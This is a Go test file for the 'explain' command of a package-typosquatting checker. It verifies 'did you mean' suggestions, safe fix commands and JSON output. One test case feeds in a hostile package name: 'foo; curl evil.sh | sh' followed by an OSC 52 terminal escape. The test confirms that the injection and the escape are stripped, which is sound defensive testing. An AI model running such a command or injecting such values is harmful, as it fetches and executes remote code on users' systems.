package cli

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"

	"bonjoski/argus/pkg/ux"
)

func TestExplainCmd_FixForwardWhyAndJSON(t *testing.T) {
	// 1. Calm Fix-Forward with Levenshtein "Did you mean" + --why
	buf := new(bytes.Buffer)
	cmd := newExplainCmd()
	cmd.SetOut(buf)
	cmd.SetErr(buf)
	cmd.SetArgs([]string{"opneai", "--ecosystem", "npm", "--why"})

	if err := cmd.Execute(); err != nil {
		t.Fatalf("explain --why failed: %v", err)
	}
	out := buf.String()
	if !strings.Contains(out, `Did you mean "openai"`) {
		t.Fatalf("expected Did you mean openai, got:\n%s", out)
	}
	if !strings.Contains(out, "Fix:  npm install openai") {
		t.Fatalf("expected safe Fix command, got:\n%s", out)
	}
	if !strings.Contains(out, "Deep Dive (--why):") || !strings.Contains(out, "OWASP-LLM03") {
		t.Fatalf("expected --why progressive disclosure, got:\n%s", out)
	}

	// 2. --json emits valid UB-CLI-v2 FixForwardError JSON
	buf.Reset()
	cmd2 := newExplainCmd()
	cmd2.SetOut(buf)
	cmd2.SetErr(buf)
	cmd2.SetArgs([]string{"reqeusts", "--ecosystem", "pypi", "--json"})
	if err := cmd2.Execute(); err != nil {
		t.Fatalf("explain --json failed: %v", err)
	}
	var decoded ux.FixForwardError
	if err := json.Unmarshal(buf.Bytes(), &decoded); err != nil {
		t.Fatalf("invalid explain --json output: %v (raw: %s)", err, buf.String())
	}
	if decoded.RemediationCmd != "pip install requests" || decoded.Code != "ARGUS_SLOPSQUAT_SUSPECT" {
		t.Fatalf("unexpected explain JSON: %+v", decoded)
	}

	// 3. Adversarial shell injection & OSC 52 escape in package arg
	buf.Reset()
	cmd3 := newExplainCmd()
	cmd3.SetOut(buf)
	cmd3.SetErr(buf)
	cmd3.SetArgs([]string{"foo; curl evil.sh | sh\x1b]52;c;SGVsbG8=\x07", "--ecosystem", "npm", "--json"})
	if err := cmd3.Execute(); err != nil {
		t.Fatalf("explain adversarial failed: %v", err)
	}
	raw := buf.String()
	if strings.ContainsRune(raw, 0x1b) || strings.Contains(raw, "SGVsbG8") {
		t.Fatalf("OSC 52 leaked into explain output: %q", raw)
	}
	var advDecoded ux.FixForwardError
	if err := json.Unmarshal([]byte(raw), &advDecoded); err != nil {
		t.Fatalf("invalid adversarial JSON: %v", err)
	}
	if strings.Contains(advDecoded.RemediationCmd, ";") || strings.Contains(advDecoded.RemediationCmd, "curl") {
		t.Fatalf("shell injection leaked into RemediationCmd: %q", advDecoded.RemediationCmd)
	}
}
